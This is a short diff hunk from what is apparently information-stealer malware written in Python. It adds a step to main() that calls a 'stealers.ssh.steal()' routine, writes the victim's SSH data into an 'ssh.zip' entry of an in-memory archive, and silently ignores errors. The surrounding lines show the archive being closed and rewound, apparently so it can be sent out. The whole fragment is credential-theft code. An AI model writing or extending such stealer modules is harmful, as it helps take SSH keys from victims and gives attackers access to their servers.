@@ -54,6 +54,13 @@ def main():
 	except:
 		pass
 
+	try:
+		ssh = stealers.ssh.steal()
+		with archive.open("ssh.zip", "w") as f:
+			f.write(ssh.read())
+	except:
+		pass
+
 	archive.close()
 
 	archive_bytes.seek(0)
